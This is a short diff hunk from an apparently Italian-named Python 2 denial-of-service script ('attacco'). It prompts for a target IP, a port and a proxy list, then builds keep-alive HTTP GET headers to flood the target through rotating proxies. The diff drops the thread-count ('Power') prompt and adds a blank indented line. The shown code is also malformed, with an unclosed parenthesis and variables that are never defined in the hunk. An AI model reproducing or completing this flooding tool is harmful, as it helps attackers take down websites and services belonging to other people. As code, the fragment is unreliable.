@@ -328,12 +328,12 @@ class attacco(threading.Thread):
 ip = raw_input("IP Target : ")
 port = input("Port : ")
 in_file = open(raw_input("Proxy.txt : ")
-thread = input("Power : ")
 proxyf = in_file.read()
 in_file.close()
  
 listaproxy = proxyf.split('\n')
 #So luong
+	
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
